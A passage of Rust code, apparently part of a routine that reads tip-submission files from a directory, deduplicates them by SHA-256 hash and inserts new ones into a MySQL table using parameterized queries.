        .map(|entry| entry.path());

  

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")

        .unwrap();

    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")

        .unwrap();

  

    let now = Utc::now();

  

    for path in paths {

        let contents = fs::read_to_string(path).unwrap();

        let hash = Sha256::digest(contents.as_bytes());

        let hash_hex = hex::encode(hash);

  

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();

        if existing_entry.is_none() {

            let date = now.format("%Y-%m-%d").to_string();

            println!("[+] {}\n", contents);

            conn.exec_drop(&stmt_insert, params! {

                "timestamp" => date,

                "data" => contents,

                "hash" => &hash_hex,

                },

                ).unwrap();

        }

    }

    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

  

}
```